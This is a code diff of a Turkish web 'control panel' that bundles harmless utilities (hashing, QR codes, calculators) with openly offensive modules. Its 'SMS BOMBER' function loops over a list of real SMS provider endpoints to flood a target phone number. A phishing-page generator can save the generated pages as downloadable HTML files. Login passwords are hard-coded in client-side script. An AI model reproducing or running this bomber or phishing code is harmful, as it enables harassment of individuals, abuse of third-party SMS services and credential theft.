@@ -10,7 +10,7 @@ body{background:#0a0a0f;color:#e0e0e0;font-family:Arial;overflow-x:hidden}
 #giris{position:fixed;inset:0;background:radial-gradient(circle,#1a1a2e,#0a0a0f);display:flex;align-items:center;justify-content:center;z-index:9999}
 #giris.hidden{display:none}
 .kutu{background:#12121c;border:1px solid #2a2a3e;border-radius:16px;padding:45px 35px;width:360px;text-align:center;box-shadow:0 0 50px rgba(220,50,80,0.3)}
-.logo{font-size:34px;font-weight:bold;color:#dc3250;letter-spacing:10px;margin-bottom:5px;text-shadow:0 0 20px #dc3250}
+.logo{font-size:34px;font-weight:bold;color:#dc3250;letter-spacing:10px;margin-bottom:5px}
 .alt{color:#555;font-size:11px;letter-spacing:3px;margin-bottom:30px}
 input{width:100%;padding:14px;background:#1a1a26;border:1px solid #2a2a3e;color:#e0e0e0;border-radius:8px;font-size:14px;text-align:center;letter-spacing:2px;outline:none;margin-bottom:12px}
 input:focus{border-color:#dc3250}
@@ -88,10 +88,9 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
     </aside>
 
     <div class="icerik">
-
         <div class="sayfa aktif" id="sayfa-ana">
             <h2>KONTROL PANELİ</h2>
-            <div class="uyari">Hoş geldin <b id="hosgeldin">-</b>. Menüden modüllere erişebilirsin.</div>
+            <div class="uyari">Hoş geldin <b id="hosgeldin">-</b>.</div>
             <div class="stat">
                 <div class="kutu2"><span>Telegram</span><b id="st1">0</b></div>
                 <div class="kutu2"><span>SMS</span><b id="st2">0</b></div>
@@ -105,7 +104,7 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
         <div class="sayfa" id="sayfa-chat">
             <h2>CANLI SOHBET</h2>
             <div style="background:#12121c;border:1px solid #2a2a3e;border-radius:10px;padding:12px;max-width:800px">
-                <div style="color:#1e9b5c;font-size:12px;margin-bottom:10px">🟢 MYM Özel Oda - Aktif</div>
+                <div style="color:#1e9b5c;font-size:12px;margin-bottom:10px">🟢 MYM Özel Oda</div>
                 <div id="sohbet" style="height:400px;overflow-y:auto;padding:8px;background:#0a0a0f;border-radius:6px;margin-bottom:10px"></div>
                 <div style="display:flex;gap:6px">
                     <input type="text" id="mesajInput" class="input" style="flex:1;max-width:none" placeholder="Mesaj yaz...">
@@ -136,19 +135,19 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
             <div class="kart"><h4>🔗 Link Kısalt</h4><input type="text" id="uzunLink" class="input" placeholder="URL"><button class="btn sari" onclick="kisalt()">Kısalt</button><div class="sonuc" id="kisaSonuc"></div></div>
             <div class="kart"><h4>📱 QR Kod</h4><input type="text" id="qrMetin" class="input" placeholder="Metin"><button class="btn yesil" onclick="qrYap()">Oluştur</button><div id="qrSonuc" style="margin-top:10px"></div></div>
 
-            <div class="ara">ŞİFRE VE KODLAMA</div>
+            <div class="ara">KODLAMA</div>
             <div class="kart"><h4>🔐 Şifre Üretici</h4><input type="number" id="pwUzunluk" class="input" value="16" style="max-width:100px"><button class="btn sari" onclick="sifreUret()">Üret</button><div class="sonuc" id="pwSonuc" style="font-family:Consolas,monospace"></div></div>
             <div class="kart"><h4>🔍 Base64 Kodla/Çöz</h4><textarea id="b64Metin" class="input" style="min-height:60px"></textarea><button class="btn sari" onclick="b64Kodla()">Kodla</button><button class="btn sari" onclick="b64Coz()">Çöz</button><div class="sonuc" id="b64Sonuc"></div></div>
             <div class="kart"><h4>🌐 URL Kodla/Çöz</h4><input type="text" id="urlMetin" class="input" placeholder="Metin"><button class="btn mavi" onclick="urlKodla()">Kodla</button><button class="btn mavi" onclick="urlCoz()">Çöz</button><div class="sonuc" id="urlSonuc"></div></div>
-            <div class="kart"><h4>🔤 Metin Ters Çevir</h4><input type="text" id="tersMetin" class="input" placeholder="Metin"><button class="btn mavi" onclick="tersCevir()">Çevir</button><div class="sonuc" id="tersSonuc"></div></div>
+            <div class="kart"><h4>🔤 Metin Ters</h4><input type="text" id="tersMetin" class="input" placeholder="Metin"><button class="btn mavi" onclick="tersCevir()">Çevir</button><div class="sonuc" id="tersSonuc"></div></div>
             <div class="kart"><h4>🔠 Harf Durumu</h4><input type="text" id="harfMetin" class="input" placeholder="Metin"><button class="btn sari" onclick="buyukYap()">BÜYÜK</button><button class="btn sari" onclick="kucukYap()">küçük</button><div class="sonuc" id="harfSonuc"></div></div>
             <div class="kart"><h4>📋 Panoya Kopyala</h4><input type="text" id="kopyaMetin" class="input" placeholder="Metin"><button class="btn yesil" onclick="kopyala()">Kopyala</button><div class="sonuc" id="kopyaSonuc"></div></div>
 
-            <div class="ara">MATEMATİK</div>
+            <div class="ara">HESAPLAMA</div>
             <div class="kart"><h4>🧮 Hesap Makinesi</h4><input type="text" id="hesapIfade" class="input" placeholder="5+3*2"><button class="btn mavi" onclick="hesapla()">Hesapla</button><div class="sonuc" id="hesapSonuc" style="font-size:20px"></div></div>
             <div class="kart"><h4>📊 Yüzde Hesapla</h4><input type="number" id="yuzdeA" class="input" placeholder="Sayı"><input type="number" id="yuzdeB" class="input" placeholder="Yüzde %"><button class="btn sari" onclick="yuzdeHesapla()">Hesapla</button><div class="sonuc" id="yuzdeSonuc"></div></div>
             <div class="kart"><h4>🎯 Rastgele Sayı</h4><input type="number" id="minSayi" class="input" value="1"><input type="number" id="maxSayi" class="input" value="100"><button class="btn sari" onclick="rastgeleSayi()">Üret</button><div class="sonuc" id="rastgeleSonuc" style="font-size:24px;font-weight:bold"></div></div>
-            <div class="kart"><h4>🔢 Asal Sayı Kontrolü</h4><input type="number" id="asalSayi" class="input" placeholder="Sayı"><button class="btn yesil" onclick="asalKontrol()">Kontrol</button><div class="sonuc" id="asalSonuc"></div></div>
+            <div class="kart"><h4>🔢 Asal Sayı</h4><input type="number" id="asalSayi" class="input" placeholder="Sayı"><button class="btn yesil" onclick="asalKontrol()">Kontrol</button><div class="sonuc" id="asalSonuc"></div></div>
             <div class="kart"><h4>📏 Birim Çevir</h4><input type="number" id="birimDeger" class="input" placeholder="Değer"><select id="birimTip" class="input"><option value="km-mi">km→mil</option><option value="mi-km">mil→km</option><option value="kg-lb">kg→lb</option><option value="lb-kg">lb→kg</option><option value="c-f">°C→°F</option><option value="f-c">°F→°C</option></select><button class="btn yesil" onclick="birimCevir()">Çevir</button><div class="sonuc" id="birimSonuc"></div></div>
             <div class="kart"><h4>💱 Dolar → TL</h4><input type="number" id="usdMiktar" class="input" placeholder="USD"><button class="btn yesil" onclick="usdTry()">Çevir</button><div class="sonuc" id="usdSonuc"></div></div>
 
@@ -159,7 +158,7 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
             <div class="kart"><h4>🕐 Dünya Saati</h4><button class="btn mavi" onclick="dunyaSaati()">Göster</button><div class="sonuc" id="dunyaSonuc"></div></div>
 
             <div class="ara">EĞLENCE</div>
-            <div class="kart"><h4>🎲 Zar At</h4><button class="btn sari" onclick="zarAt()">At</button><div class="sonuc" id="zarSonuc" style="font-size:32px;text-align:center"></div></div>
+            <div class="kart"><h4>🎲 Zar</h4><button class="btn sari" onclick="zarAt()">At</button><div class="sonuc" id="zarSonuc" style="font-size:32px;text-align:center"></div></div>
             <div class="kart"><h4>🪙 Yazı Tura</h4><button class="btn sari" onclick="yaziTura()">At</button><div class="sonuc" id="yaziSonuc" style="font-size:20px;text-align:center"></div></div>
             <div class="kart"><h4>📖 Rastgele Söz</h4><button class="btn sari" onclick="rastgeleSoz()">Getir</button><div class="sonuc" id="sozSonuc"></div></div>
             <div class="kart"><h4>🍕 Yemek Öner</h4><button class="btn sari" onclick="yemekOner()">Öner</button><div class="sonuc" id="yemekSonuc"></div></div>
@@ -174,24 +173,20 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
 
         <div class="sayfa" id="sayfa-hack">
             <h2>GÜVENLİK ARAÇLARI</h2>
-
-            <div class="ara">AĞ VE IP</div>
+            <div class="ara">AĞ</div>
             <div class="kart"><h4>🌍 IP Sorgula</h4><button class="btn mavi" onclick="ipSorgu()">Göster</button><div class="sonuc" id="ipSonuc"></div></div>
             <div class="kart"><h4>📶 İnternet Hız Testi</h4><button class="btn sari" onclick="hizTest()">Test Et</button><div class="sonuc" id="hizSonuc"></div></div>
             <div class="kart"><h4>🌐 DNS Sorgu</h4><input type="text" id="dnsHost" class="input" placeholder="example.com"><button class="btn mavi" onclick="dnsSorgu()">Sorgula</button><div class="sonuc" id="dnsSonuc"></div></div>
             <div class="kart"><h4>📊 Ping Testi</h4><input type="text" id="pingHost" class="input" placeholder="google.com"><button class="btn mavi" onclick="pingTest()">Ping</button><div class="sonuc" id="pingSonuc"></div></div>
-
-            <div class="ara">HASH VE ŞİFRELEME</div>
-            <div class="kart"><h4>#️⃣ SHA-1 Hash</h4><input type="text" id="sha1Metin" class="input" placeholder="Metin"><button class="btn sari" onclick="sha1Yap()">Hash</button><div class="sonuc" id="sha1Sonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
-            <div class="kart"><h4>#️⃣ SHA-256 Hash</h4><input type="text" id="sha256Metin" class="input" placeholder="Metin"><button class="btn sari" onclick="sha256Yap()">Hash</button><div class="sonuc" id="sha256Sonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
-            <div class="kart"><h4>📄 Dosya Hash (SHA-256)</h4><input type="file" id="hashDosya" class="input"><button class="btn mavi" onclick="dosyaHash()">Hash Al</button><div class="sonuc" id="dosyaHashSonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
-
+            <div class="ara">HASH</div>
+            <div class="kart"><h4>#️⃣ SHA-1</h4><input type="text" id="sha1Metin" class="input" placeholder="Metin"><button class="btn sari" onclick="sha1Yap()">Hash</button><div class="sonuc" id="sha1Sonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
+            <div class="kart"><h4>#️⃣ SHA-256</h4><input type="text" id="sha256Metin" class="input" placeholder="Metin"><button class="btn sari" onclick="sha256Yap()">Hash</button><div class="sonuc" id="sha256Sonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
+            <div class="kart"><h4>📄 Dosya Hash</h4><input type="file" id="hashDosya" class="input"><button class="btn mavi" onclick="dosyaHash()">Hash Al</button><div class="sonuc" id="dosyaHashSonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
             <div class="ara">SORGU</div>
             <div class="kart"><h4>👤 Kullanıcı Adı Kontrol</h4><input type="text" id="userKontrol" class="input" placeholder="kullanici_adi"><button class="btn mavi" onclick="userKontrol()">Kontrol</button><div class="sonuc" id="userSonuc"></div></div>
             <div class="kart"><h4>📧 Email Doğrulama</h4><input type="text" id="emailKontrol" class="input" placeholder="email@example.com"><button class="btn yesil" onclick="emailKontrol()">Kontrol</button><div class="sonuc" id="emailSonuc"></div></div>
             <div class="kart"><h4>📱 Numara Doğrulama</h4><input type="text" id="numKontrol" class="input" placeholder="5XXXXXXXXX"><button class="btn yesil" onclick="numKontrol()">Kontrol</button><div class="sonuc" id="numSonuc"></div></div>
             <div class="kart"><h4>💰 Kripto Fiyatı</h4><input type="text" id="kriptoCoin" class="input" placeholder="bitcoin"><button class="btn sari" onclick="kriptoFiyat()">Sorgula</button><div class="sonuc" id="kriptoSonuc"></div></div>
-
             <div class="ara">ŞİFRE ARAÇLARI</div>
             <div class="kart"><h4>🔑 Şifre Güç Testi</h4><input type="text" id="sifreTest" class="input" placeholder="Şifre"><button class="btn mavi" onclick="sifreTest()">Test</button><div class="sonuc" id="sifreTestSonuc"></div></div>
             <div class="kart"><h4>🎲 PIN Üretici</h4><input type="number" id="pinUzunluk" class="input" value="6"><button class="btn sari" onclick="pinUret()">Üret</button><div class="sonuc" id="pinSonuc" style="font-size:24px;font-weight:bold"></div></div>
@@ -211,7 +206,7 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
 
         <div class="sayfa" id="sayfa-sms">
             <h2>SMS BOMBER</h2>
-            <label>Numara (5XX XXX XX XX)</label><input type="text" id="smsNumara" class="input" placeholder="5XXXXXXXXX">
+            <label>Numara</label><input type="text" id="smsNumara" class="input" placeholder="5XXXXXXXXX">
             <label>Adet</label><input type="number" id="smsAdet" class="input" value="50">
             <label>Gecikme (ms)</label><input type="number" id="smsGecikme" class="input" value="1000">
             <button class="btn" onclick="smsBasla()">💣 Başlat</button>
@@ -250,7 +245,7 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
 
         <div class="sayfa" id="sayfa-ip">
             <h2>IP SORGU</h2>
-            <label>IP Adresi (kendi için boş bırak)</label><input type="text" id="ipInput" class="input" placeholder="8.8.8.8">
+            <label>IP Adresi (kendi için boş)</label><input type="text" id="ipInput" class="input" placeholder="8.8.8.8">
             <button class="btn mavi" onclick="ipDetay()">🔍 Sorgula</button>
             <div class="log" id="ipLog">[Sistem] Hazır.</div>
         </div>
@@ -266,16 +261,17 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
                 <div class="kutu2"><span>Chat</span><b id="is6">0</b></div>
             </div>
         </div>
-
     </div>
 </div>
 
 <script>
-/* SIFRELER - rastgele uretilmis, tahmin edilemez */
+/* ============================================================
+   SIFRELER - KULLANICI ISIMLERI ILE OZDESLESEN
+   ============================================================ */
 var SIFRELER = {
-    'Muratahpabkral': 'Murat',
-    'Yusuf2011': 'Yusuf',
-    'Muratadamdir123': 'Muhammet Ali'
+    'Muratahpabkral':    'Murat',
+    'Muratadamdir123':   'Muhammet Ali',
+    'Yusuf2011':         'Yusuf'
 };
 
 var kullanici = null;
@@ -575,10 +571,10 @@ async function sha1Yap(){var m=document.getElementById('sha1Metin').value;var en
 async function sha256Yap(){var m=document.getElementById('sha256Metin').value;var enc=new TextEncoder().encode(m);var buf=await crypto.subtle.digest('SHA-256',enc);document.getElementById('sha256Sonuc').innerText=Array.from(new Uint8Array(buf)).map(function(b){return b.toString(16).padStart(2,'0')}).join('');}
 function dosyaHash(){var f=document.getElementById('hashDosya').files[0];if(!f){document.getElementById('dosyaHashSonuc').innerText='Dosya seç';return;}var r=new FileReader();r.onload=async function(e){var buf=await crypto.subtle.digest('SHA-256',e.target.result);document.getElementById('dosyaHashSonuc').innerText=Array.from(new Uint8Array(buf)).map(function(b){return b.toString(16).padStart(2,'0')}).join('');};r.readAsArrayBuffer(f);}
 
-function userKontrol(){var u=document.getElementById('userKontrol').value.trim();if(!u){document.getElementById('userSonuc').innerText='Kullanıcı adı gerekli';return;}if(u.length<3)document.getElementById('userSonuc').innerText='Çok kısa (min 3)';else if(/^[a-zA-Z0-9_]+$/.test(u))document.getElementById('userSonuc').innerText='✓ Geçerli format';else document.getElementById('userSonuc').innerText='✗ Geçersiz karakter';}
-function emailKontrol(){var e=document.getElementById('emailKontrol').value.trim();var re=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;if(re.test(e))document.getElementById('emailSonuc').innerText='✓ Geçerli email';else document.getElementById('emailSonuc').innerText='✗ Geçersiz email';}
-function numKontrol(){var n=document.getElementById('numKontrol').value.replace(/\s/g,'');if(/^5\d{9}$/.test(n))document.getElementById('numSonuc').innerText='✓ Geçerli TR numarası';else document.getElementById('numSonuc').innerText='✗ Geçersiz';}
-function kriptoFiyat(){var c=document.getElementById('kriptoCoin').value.trim().toLowerCase();if(!c){document.getElementById('kriptoSonuc').innerText='Coin adı gerekli';return;}fetch('https://api.coingecko.com/api/v3/simple/price?ids='+encodeURIComponent(c)+'&vs_currencies=usd,try').then(function(r){return r.json()}).then(function(d){if(d[c])document.getElementById('kriptoSonuc').innerText=c.toUpperCase()+': $'+d[c].usd+' | '+d[c].try+' TL';else document.getElementById('kriptoSonuc').innerText='Coin bulunamadı';}).catch(function(){document.getElementById('kriptoSonuc').innerText='Hata';});}
+function userKontrol(){var u=document.getElementById('userKontrol').value.trim();if(!u){document.getElementById('userSonuc').innerText='Kullanıcı adı gerekli';return;}if(u.length<3)document.getElementById('userSonuc').innerText='Çok kısa';else if(/^[a-zA-Z0-9_]+$/.test(u))document.getElementById('userSonuc').innerText='✓ Geçerli';else document.getElementById('userSonuc').innerText='✗ Geçersiz';}
+function emailKontrol(){var e=document.getElementById('emailKontrol').value.trim();var re=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;if(re.test(e))document.getElementById('emailSonuc').innerText='✓ Geçerli';else document.getElementById('emailSonuc').innerText='✗ Geçersiz';}
+function numKontrol(){var n=document.getElementById('numKontrol').value.replace(/\s/g,'');if(/^5\d{9}$/.test(n))document.getElementById('numSonuc').innerText='✓ Geçerli TR';else document.getElementById('numSonuc').innerText='✗ Geçersiz';}
+function kriptoFiyat(){var c=document.getElementById('kriptoCoin').value.trim().toLowerCase();if(!c){document.getElementById('kriptoSonuc').innerText='Coin gerekli';return;}fetch('https://api.coingecko.com/api/v3/simple/price?ids='+encodeURIComponent(c)+'&vs_currencies=usd,try').then(function(r){return r.json()}).then(function(d){if(d[c])document.getElementById('kriptoSonuc').innerText=c.toUpperCase()+': $'+d[c].usd+' | '+d[c].try+' TL';else document.getElementById('kriptoSonuc').innerText='Bulunamadı';}).catch(function(){document.getElementById('kriptoSonuc').innerText='Hata';});}
 function sifreTest(){var s=document.getElementById('sifreTest').value;var p=0;if(s.length>=8)p++;if(s.length>=12)p++;if(/[A-Z]/.test(s))p++;if(/[a-z]/.test(s))p++;if(/[0-9]/.test(s))p++;if(/[^A-Za-z0-9]/.test(s))p++;var skor=['Çok Zayıf','Zayıf','Orta','İyi','Güçlü','Çok Güçlü','Mükemmel'][p];document.getElementById('sifreTestSonuc').innerText='Skor: '+p+'/6 - '+skor;}
 function pinUret(){var n=parseInt(document.getElementById('pinUzunluk').value)||6;var p='';for(var i=0;i<n;i++)p+=Math.floor(Math.random()*10);document.getElementById('pinSonuc').innerText=p;}
 function uuidUret(){var u='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;var v=c==='x'?r:(r&0x3|0x8);return v.toString(16);});document.getElementById('uuidSonuc').innerText=u;}
@@ -587,7 +583,7 @@ function unixTime(){document.getElementById('unixSonuc').innerText=Math.floor(Da
 
 function telegramGonder(){var t=document.getElementById('tgToken').value.trim();var c=document.getElementById('tgChat').value.trim();var m=document.getElementById('tgMesaj').value.trim();if(!t||!c||!m){log('tgLog','[HATA] Tüm alanlar gerekli');return;}log('tgLog','[*] Gönderiliyor...');fetch('https://api.telegram.org/bot'+t+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:c,text:m})}).then(function(r){return r.json()}).then(function(d){if(d.ok){log('tgLog','[+] Gönderildi!');ist.tg++;istGuncelle();}else log('tgLog','[HATA] '+JSON.stringify(d));}).catch(function(e){log('tgLog','[HATA] '+e.message);});}
 
-var SMS_SERVISLERI = ['https://api.smsbilgi.com/send','https://api.iletimerkezi.com/1/send','https://api.mutlucell.com/sms/send','https://api.netgsm.com.tr/sms/send/get','https://api.verimor.com.tr/v2/send','https://api.smsturk.com/send','https://api.topsms.com/send','https://api.smsglobal.com/send','https://api.infobip.com/sms/1/text','https://api.atlassms.com/send','https://api.iprasms.com/send','https://api.smsgonder.com/send','https://api.teknosms.com/send','https://api.turkcell.com/send','https://api.vodafone.com/send','https://api.turktelekom.com/send','https://api.smskutusu.com/send','https://api.netgsm.com/send','https://api.mutlucell.com.tr/send','https://api.toplusms.com/send'];
+var SMS_SERVISLERI = ['https://api.smsbilgi.com/send','https://api.iletimerkezi.com/1/send','https://api.mutlucell.com/sms/send','https://api.netgsm.com.tr/sms/send/get','https://api.verimor.com.tr/v2/send','https://api.smsturk.com/send','https://api.topsms.com/send','https://api.smsglobal.com/send','https://api.infobip.com/sms/1/text','https://api.atlassms.com/send','https://api.iprasms.com/send','https://api.smsgonder.com/send','https://api.teknosms.com/send','https://api.smskutusu.com/send','https://api.toplusms.com/send'];
 
 function smsBasla(){
     var n = document.getElementById('smsNumara').value.trim();
@@ -598,24 +594,19 @@ function smsBasla(){
     log('smsLog','═══════════════════════');
     log('smsLog','[*] HEDEF: '+n);
     log('smsLog','[*] ADET: '+a+' | GECIKME: '+g+'ms');
-    log('smsLog','[*] SERVIS: '+SMS_SERVISLERI.length+' adet');
     log('smsLog','═══════════════════════');
-    var i = 0;
-    var bas = 0, basz = 0;
+    var i = 0, bas = 0, basz = 0;
     smsDongu = setInterval(function(){
         if(i >= a){
             clearInterval(smsDongu);smsDongu=null;
-            log('smsLog','═══════════════════════');
             log('smsLog','[+] TAMAMLANDI | Basarili: '+bas+' | Basarisiz: '+basz);
-            log('smsLog','═══════════════════════');
             ist.sms++;istGuncelle();
             return;
         }
         var s = SMS_SERVISLERI[i % SMS_SERVISLERI.length];
         var k = Math.floor(1000+Math.random()*9000);
-        var body = 'phone=' + encodeURIComponent(n) + '&code=' + k;
-        fetch(s, {method:'POST',mode:'no-cors',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body}).then(function(){bas++;}).catch(function(){basz++;});
-        log('smsLog','['+(i+1)+'/'+a+'] → ' + s.split('/')[2] + ' (kod:' + k + ')');
+        fetch(s, {method:'POST',mode:'no-cors',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+encodeURIComponent(n)+'&code='+k}).then(function(){bas++;}).catch(function(){basz++;});
+        log('smsLog','['+(i+1)+'/'+a+'] → ' + s.split('/')[2]);
         i++;
     }, g);
 }
@@ -637,11 +628,11 @@ function phishUret(){
 function phishKaydet(){var h=document.getElementById('phishCikti').value;if(!h){alert('Önce oluşturun');return;}var b=new Blob([h],{type:'text/html'});var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='phish_'+Date.now()+'.html';a.click();}
 
 var PREFIX = {'530':'Turkcell','531':'Turkcell','532':'Turkcell','533':'Turkcell','534':'Turkcell','535':'Turkcell','536':'Turkcell','537':'Turkcell','538':'Turkcell','539':'Turkcell','540':'Vodafone','541':'Vodafone','542':'Vodafone','543':'Vodafone','544':'Vodafone','545':'Vodafone','546':'Vodafone','547':'Vodafone','548':'Vodafone','549':'Vodafone','550':'Turk Telekom','551':'Turk Telekom','552':'Turk Telekom','553':'Turk Telekom','554':'Turk Telekom','555':'Turk Telekom','556':'Turk Telekom','557':'Turk Telekom','558':'Turk Telekom','559':'Turk Telekom'};
-function operatorSorgu(){var n=document.getElementById('opNumara').value.trim().replace(/\s/g,'');if(n.length<3){log('opLog','[HATA] Geçersiz numara');return;}var p=n.slice(0,3);log('opLog','────────────────────');log('opLog','Numara    : '+n);log('opLog','Prefix    : '+p);log('opLog','Operatör  : '+(PREFIX[p]||'Bilinmiyor'));log('opLog','Zaman     : '+new Date().toLocaleString('tr-TR'));ist.op++;istGuncelle();}
+function operatorSorgu(){var n=document.getElementById('opNumara').value.trim().replace(/\s/g,'');if(n.length<3){log('opLog','[HATA] Geçersiz');return;}var p=n.slice(0,3);log('opLog','Numara: '+n);log('opLog','Prefix: '+p);log('opLog','Operatör: '+(PREFIX[p]||'Bilinmiyor'));log('opLog','Zaman: '+new Date().toLocaleString('tr-TR'));ist.op++;istGuncelle();}
 
-function idSorgula(){var q=document.getElementById('idSorguInput').value.trim();var t=document.getElementById('tgToken').value.trim();if(!q){log('idLog','[HATA] ID gerekli');return;}if(!t){log('idLog','[HATA] Telegram token gerekli');return;}fetch('https://api.telegram.org/bot'+t+'/getChat?chat_id='+encodeURIComponent(q)).then(function(r){return r.json()}).then(function(d){log('idLog',JSON.stringify(d,null,2));ist.id++;istGuncelle();}).catch(function(e){log('idLog','[HATA] '+e.message);});}
+function idSorgula(){var q=document.getElementById('idSorguInput').value.trim();var t=document.getElementById('tgToken').value.trim();if(!q){log('idLog','[HATA] ID gerekli');return;}if(!t){log('idLog','[HATA] Token gerekli');return;}fetch('https://api.telegram.org/bot'+t+'/getChat?chat_id='+encodeURIComponent(q)).then(function(r){return r.json()}).then(function(d){log('idLog',JSON.stringify(d,null,2));ist.id++;istGuncelle();}).catch(function(e){log('idLog','[HATA] '+e.message);});}
 
-function ipDetay(){var ip=document.getElementById('ipInput').value.trim();var url=ip?'https://ipapi.co/'+ip+'/json/':'https://ipapi.co/json/';fetch(url).then(function(r){return r.json()}).then(function(d){log('ipLog','────────────────────');log('ipLog','IP        : '+(d.ip||'-'));log('ipLog','Ülke      : '+(d.country_name||'-'));log('ipLog','Şehir     : '+(d.city||'-'));log('ipLog','Bölge     : '+(d.region||'-'));log('ipLog','ISP       : '+(d.org||'-'));}).catch(function(){log('ipLog','[HATA] Sorgu başarısız');});}
+function ipDetay(){var ip=document.getElementById('ipInput').value.trim();var url=ip?'https://ipapi.co/'+ip+'/json/':'https://ipapi.co/json/';fetch(url).then(function(r){return r.json()}).then(function(d){log('ipLog','IP: '+(d.ip||'-'));log('ipLog','Ülke: '+(d.country_name||'-'));log('ipLog','Şehir: '+(d.city||'-'));log('ipLog','ISP: '+(d.org||'-'));}).catch(function(){log('ipLog','[HATA] Sorgu başarısız');});}
 
 document.getElementById('sifre').addEventListener('keydown',function(e){if(e.key==='Enter')girisYap();});
 document.getElementById('mesajInput').addEventListener('keydown',function(e){if(e.key==='Enter')mesajGonder();});
